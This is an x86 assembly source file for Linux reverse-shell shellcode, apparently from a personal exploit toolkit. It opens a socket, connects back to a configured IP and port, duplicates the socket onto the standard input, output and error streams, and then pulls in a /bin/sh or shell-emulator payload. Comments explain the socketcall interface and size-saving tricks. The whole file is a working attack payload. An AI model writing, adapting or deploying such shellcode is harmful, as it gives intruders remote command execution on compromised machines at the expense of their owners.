 	;; Evan Jensen (wont) 021813
	;; Connect back shellcode
	;; Handy One liner for IP
	;; ''.join(['%02x'%int(x)for x in'1.1.1.1'.split('.')][::-1])
	;; port is littleEndian
%include "short32.s"
%include "syscall.s"
%include "util.s"
	
%define IP   dword      ip(127,0,0,1) 
%define PORT word       htons(7788)	
%define AF_INET         2
%define SOCK_STREAM     1
%define ANY_PROTO       0
	
	;; Socketcall is the systemcall we use to manipulate sockets
	;; It's linux specific. Use man socketcall.
	;; first argument is an integer and second is an arg struct ptr
BITS 32
	global main
main:
	xor eax,eax
	mov ebx,eax
	push eax
	push byte SOCK_STREAM
	push byte AF_INET
	inc ebx			
	mov ecx,esp
	mov al,socketcall 
	SYSTEM_CALL		;socket() ebx=1
	
	;eax has socket
	inc ebx
	
IPandPort:
	push IP
	push PORT
	push bx 		;bx=2 AF_INET
	mov ecx,esp
	push byte 0x10		;size of sockaddr
	push ecx
	push eax		;socket fd
	inc ebx			;ebx=3 connect()
	mov ecx,esp
	SYSTEM_CALL(socketcall)
;;; connect reurns zero on success
	
	;; mov edi,eax		;connect fd
	pop ebx			;the top of the stack has our socket
	push byte 2
	pop ecx			;loop counter and fd arg for dup2
copy:
	mov al,dup2
	SYSTEM_CALL		;dup2(ebx,ecx)
;;; the system_call macro that takes an argument also zero's it out
;;; using extra bytes. We can save some space by assuming that
;;; dup2 won't error. 
	dec ecx
	jns copy
	
	;; Any local shellcode here

%define EMULATOR
%ifdef 	EMULATOR
	;; shell emulating shellcode
	incbin "../32shellEmulator/shellcode"
%else
	;; ordinary shellcode (/bin/sh)
	incbin "../32bitLocalBinSh/shellcode"
%endif
 